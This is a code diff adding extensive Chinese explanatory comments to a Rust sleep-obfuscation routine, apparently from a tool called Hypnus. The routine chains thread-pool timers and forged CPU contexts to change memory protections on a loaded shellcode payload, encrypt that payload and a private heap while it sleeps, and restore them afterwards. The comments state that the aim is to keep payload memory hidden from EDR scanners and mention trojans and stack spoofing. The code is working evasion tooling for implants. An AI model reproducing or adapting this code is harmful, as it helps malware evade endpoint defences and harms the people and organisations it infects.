@@ -257,7 +257,7 @@ impl Hypnus {
             base,
             size,
             time,
-            mode,
+            mode,// 在宏调用时赋予了实参.这是省略写法=mode:mode, rust中,实例化一个结构体时,如果当前作用域内存在一个与结构体字段同名的变量.可以省略:value的赋值部分
             cfg: init_config()?,
         })
     }
@@ -265,9 +265,13 @@ impl Hypnus {
     /// Performs memory obfuscation using a thread-pool timer sequence.
     fn timer(&mut self) -> Result<()> {
         unsafe {
-            // Determine if heap obfuscation and RWX memory should be use
+            // Determine if heap obfuscation and RWX memory should be use:heap/projection都是ObfMode字段的值.
+            // 堆混淆的开关,决定主线程在挂起前/唤醒后,是否需要调用RDTSC硬件指令生成密钥对私有HpynusHeap xor/解密.一次保护载荷在运行期动态申请的内存不被扫描.
+            // 用在后续let key = if heap{}这里,检查是否启用自定义堆加密.当然还有后续解锁内存的操作
             let heap = self.mode.contains(ObfMode::Heap);
-            // 指定内存权限
+            // 指定内存权限.载荷唤醒后的权限,用于在ctx[7]载荷解密后,将内存恢复为rx还是rwx.
+            // ctxs[7].R9  = protection这里,准备调用NtProtectVirtualMemory.此时刚解密载荷内存处于rw.如果cpu跳过去直接执行会触发dep导致崩溃.这时要R9=protection将内存改为rwx/rx.因为合法程序只有rx,不允许又可写又可执行.
+            // 这里保存rwx,因为有些远控木马为了躲避特征扫描,会边运行\边解密\边重写自己内存指令.这时候不得不妥协
             let protection = if self.mode.contains(ObfMode::Rwx) {
                 PAGE_EXECUTE_READWRITE
             } else {
@@ -275,10 +279,10 @@ impl Hypnus {
             };
 
             // Initialize two synchronization events:创建两个anonymous内核事件对象,作为跨线程池同步的信号,用于控制寄存器快照\混淆链启动等关键阶段的先后执行顺序
-
-            // 栈上预留三个数组位置(实际使用两个),用于接收从内核传回的事件句柄
+            // 栈上预留三个数组位置,接收从内核传回的事件句柄.分别用于：快照同步、混淆链启动、混淆链结束唤醒
             let mut events = [null_mut(); 3];
             for event in &mut events {
+                // 通过ffi直接调用,是否够隐蔽?是否需要dinvk中的间接调用或breakpoint方式调用?虽然会增加复杂度.
                 let status = NtCreateEvent(
                     // 输出:内核创建成功的对象地址存放处
                     event,
@@ -342,13 +346,14 @@ impl Hypnus {
             let mut ctx_init = CONTEXT {
                 ContextFlags: CONTEXT_FULL,
                 // 这里仍处于impl Hypnus中,因此self为Hypnus结构体
-                // rtl_capture_context=RtlCaptureContext;P1Home=rcx
+                // P1Home 位于 CONTEXT 结构体内存偏移的 0x0 处。配合 trampoline中的 jmp [rcx]，这里利用结构体首地址作为跳转跳板，让 CPU 准确跳入RtlCaptureContext
                 P1Home: self.cfg.
                 rtl_capture_context.as_u64(),
                 ..Default::default()
             };
 
-            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.要回调RtlCaptureContext,它的第一个参数对应的是线程池唤醒的rdx(即第二参数),所以需要trampoline将rdx移入rcx.这里如果用函数包装一下调整参数位置和这种trampoline的方式有啥优劣?
+            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.要回调RtlCaptureContext,它的第一个参数对应的是线程池唤醒的rdx(即第二参数),所以需要trampoline将rdx移入rcx.
+            // 这里如果用函数包装一下调整参数位置和这种trampoline的方式是否可行.不行.用一个函数来wrapper去接收参数并转调.rustc产生的prologue会操作栈.后续调用RtlCaptureContext/NtContinue时,栈帧结构发生了改变.会导致抓到的快照包含错误的rsp偏移,后续的栈伪造会全部错位;而Trampoline,是纯粹的汇编指令,不操作栈,没有Prologue/Epilogue.只在cpu寄存器里倒腾数据,然后直接跳转jmp rax.保证物理栈状态时干净的,不影响后续栈伪造链条
             // 唤醒线程池(TpSetTimer)
             // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
             // ensuring a clean transition with no extra instructions before context capture.
@@ -373,7 +378,7 @@ impl Hypnus {
             }
 
             // LARGE_INTEGER win特有的64位的union:用于表示超大整数.是win处理系统事件/性能计数的唯一标准
-            // core::mem::zero,将该64位内存全部刷为0,防止被之前脏数据干扰
+            // core::mem::zeroed,将该64位内存全部刷为0,防止被之前脏数据干扰
             let mut delay = zeroed::<LARGE_INTEGER>();
 
             // win内核的时间精度是100纳秒(1ms毫秒=1000us微秒;1us=10*100纳秒).1ms=10000个100纳秒单位.即100i64 * 10_000表示100ms
@@ -506,7 +511,7 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             // shellcode通常以 PAGE_EXECUTE_READ 运行,下一步要执行XOR加密就必须把内存改为write.否则会触发access violation导致蓝屏
             ctxs[1].R9  = PAGE_READWRITE as u64;
-            // NtProtectVirtualMemory 有 5 个参数,后续有通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上读取第五个参数的代码
+            // NtProtectVirtualMemory 有 5 个参数,后续有通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上写入第五个参数的代码
 
             // Encrypt region
             // 利用系统自带加密函数SystemFunction040对指定内存加密.发生在ctx[1]修改内存权限为rw之后,在ctxs[5]进入休眠之前
@@ -619,29 +624,47 @@ impl Hypnus {
                 TpSetTimer(timer, &mut delay, 0, 0);
             }
 
-            // Optional heap encryption
-            let key = if heap {
-                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
+            // Optional heap encryption:hypnus主线程休眠前,为了防止内存扫描器发现内存中动态载荷执行的最后一道防御.虽然前通过SystemFunction040加密.然如果载荷在运行期间动态申请了额外内存(即堆内存,如存放配置,解密后字符串,网络回传数据)这些堆内存依然是明文暴露的
+            // 这段作用是如果在配置中开启堆混淆(ObfMode::Heap),则在主线程挂起(等待假调用栈执行)之前,立刻生成一个随机8字节密钥,把整个自定义堆里所有分配的内存块全部用XOR(异或)加密
+            let key = 
+            // if在c/c++中是语句statement没有返回值,但在rust中它是expression表达式,有返回值.
+            if heap {
+                let key = 
+                // 直接映射CPU底层硬件指令(rust内置函数,返回u64):汇编指令RDTSC,read time-stamp counter.用于读取cpu自开机以来经过的时钟周期数clock cycles.
+                // 普通的rand()引入随机数标准库,会增加程序体积和导入表特征.RDTSC是一条单周期的cpu硬件指令,开销极低.且cpu运行在GHz级别,时钟周期在微秒级飞速变化,将其作为加密密钥,根本无法预测
+                core::arch::x86_64::_rdtsc().
+                // 将u64转为长度为8的字节数组[u8;8],采用小端序little-endian(win64默认内存排布方式).这么做因为底层加密函数是以字节为单位xor的,必须把大数字打散为字节数组.
+                to_le_bytes();
+                // 后面会把主线程挂起,当再次唤醒主线程,需要用这个key再做一次xor(再次xor可以解密).所以要把key传出去
                 obfuscate_heap(&key);
                 Some(key)
             } else {
                 None
             };
 
-            // Wait for chain completion
-            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
+            // Wait for chain completion:event[1]是ctxs[0].jmp(...,nt_wait_for_single)中rcx的值,作用是解除混淆链的阻塞,系统worker线程解除阻塞,开始一次向下执行加密和休眠操作;event[2]绑定在ctxs[9]等待所有的混淆功能结束.在event[2]设置完成之前,期间主线程一直处于Wait:UserRequest,不占用cpu资源
+            // 此处NtSignalAndWaitForSingleObject,进入ring0的单一syscall,告诉win内核调度器.在同一个不可中断的操作周期,把event[1]的状态改为有信号,并立刻把我自己踢出cpu运行队列,放入等待的event[2]的休眠队列
+            // 因为在win的抢占式多任务环境下.NtWaitForSingleObject之间会有时间差,导致执行的时序混乱.
+            status = NtSignalAndWaitForSingleObject(events[1], events[2],
+            // 是否可被唤醒
+            0,
+            // 等待时间
+            null_mut());
             if !NT_SUCCESS(status) {
                 bail!(s!("NtSignalAndWaitForSingleObject Failed"));
             }
 
-            // Undo heap encryption
+            // Undo heap encryption.撤销堆堆加密
             if let Some(key) = key {
                 obfuscate_heap(&key);
             }
 
-            // Cleanup
+            // Cleanup:win内核中,所有东西(线程/事件/文件)都是由对象管理器管理.管理器会对象加引用计数,并在当前进程句柄表分配slot指向对应的内核对象.
+            // NtClose:通知内核释放该句柄表的插槽。由于当前线程本身还在运行（主线程没死），内核对象的引用计数减 1，不会销毁线程本身，但切断了这条多余的访问通道
             NtClose(h_thread);
+            // 释放当初通过 TpAllocPool 创建的那个私有单线程池（TP_POOL）.底层会通知内核销毁绑定的 Worker  Factory，拆除底层的 IOCP（I/O完成端口）队列，并安全地终止那个帮我们跑完 ROP 链的 Worker 线程。所有属于这个线程池的 _TP_TIMER 结构体也会被悉数回收
             CloseThreadpool(pool);
+            // 将所有的内核 KEVENT对象的句柄关闭。由于没有其他人再引用这些事件，它们的引用计数归零，内核立刻将其占用的 Non-Paged Pool（非分页内存）回收
             events.iter().for_each(|h| {
                 NtClose(*h);
             });
@@ -1198,18 +1221,33 @@ impl<T> Asu64 for T {
 
 /// Iterates over all entries in the process heap and applies
 /// an XOR operation to the data of entries marked as allocated.
+/// 
+/// 通过RtlWalkHeap遍历HypnusHeap(自定义的私有堆内存)中每个内存块.如果该内存块正在使用,把它里面的数据和则会个8字节循环xor运算.将其变为乱码.
+/// 
+/// 绝不能用该方法加密win默认进程堆.因为os后台线程可能随时读写默认堆,读到乱码会蓝屏/进程崩溃.这也是hypnus必须自定义allocator.rs原因
+/// 
+/// 目标是隐蔽载荷的动态生成数据.载荷运行中会malloc/new一些内存,如果不对这些内存加密,edr扫描时会抓到明文.Heap在win中不是一块连续的内存,是由NTDLL的Heap Manager维护的一些里复杂链表\树\内存段segments组成.
 fn obfuscate_heap(key: &[u8; 8]) {
+
+    // allocator.rs中获取自定义heap的handle.因为NT内核视角下,heap指向的是一个巨大的undocumented结构体_HEAP(位于进程堆内存区域开头).绝不能在win默认堆中加密
     let heap = HypnusHeap::get();
     if heap.is_null() {
         return;
     }
 
     // Walk through all heap entries
-    let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
+    let mut entry = unsafe { 
+        // 在当前函数栈上开辟一块内存,大小是RTL_HEAP_WALK_ENTRY结构体的大小,并将其每个字节刷为0(因为底层RtlWalkHeap是有状态的,其在遍历堆时会记住上次遍历状态,不清零会Access Violation)
+        zeroed::<RTL_HEAP_WALK_ENTRY>() };
+    // 调用RtlWalkHeap.传入堆handle,内核在堆里找到下一个内存块,把这个内存块的起始地址/用户数据/块属性填入到entry中
     while RtlWalkHeap(heap, &mut entry) != 0 {
         // Check if the entry is in use (allocated block)
+        // win下调用c的mallco/c++的new/rust来分配内存时,底层最终调用了RtlAllocteHeap.为了管理内存,堆管理器会在申请的内存前/后面加上元数据用于控制.当RtlWalkHeap读取这些元数据时,会将其翻译为本项目中的RTL_HEAP_WALK_ENTRY结构体,其中的Flags字段在原型中是WORD(双字节)类型的,使用二进制位bit来表示不同状态(0x0004,这里只是0x0004这个数值,不是类型.比如0x20也是数字,不是u32这种类型)就是busy的状态.0x0004二进制是0100,所以与4做位与操作,就能检测是否是busy状态
+        // 内存块有两种状态:Free/Busy.对free内存块加密后影响后续堆管理器继续分配内存,导致严重错误.在win sdk,win把4宏定义为#define PROCESS_HEAP_ENTRY_BUSY 0x0004
         if entry.Flags & 4 != 0 {
-            xor(entry.DataAddress as *mut u8, entry.DataSize, key);
+            xor(
+                // 执行用户数据区域第一个字节
+                entry.DataAddress as *mut u8, entry.DataSize, key);
         }
     }
 }
